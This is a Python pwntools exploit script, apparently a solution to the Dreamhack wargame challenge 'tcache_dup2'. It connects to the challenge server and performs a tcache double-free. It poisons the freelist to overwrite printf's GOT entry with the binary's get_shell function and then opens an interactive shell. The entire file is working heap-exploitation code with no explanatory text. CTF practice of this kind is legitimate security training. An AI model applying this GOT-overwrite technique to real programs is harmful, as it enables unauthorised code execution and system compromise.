from pwn import *

p = remote("host1.dreamhack.games", 20078)
e = ELF("./tcache_dup2")

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def modify(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))

create(0x10, 'A'*8)
create(0x10, 'A'*8)

delete(0)
modify(0, 0xc, "012345678")
delete(0)

modify(0, 0x10, p64(e.got["printf"]))
create(0x10, 'B'*8)
create(0x10, p64(e.symbols["get_shell"]))

p.interactive()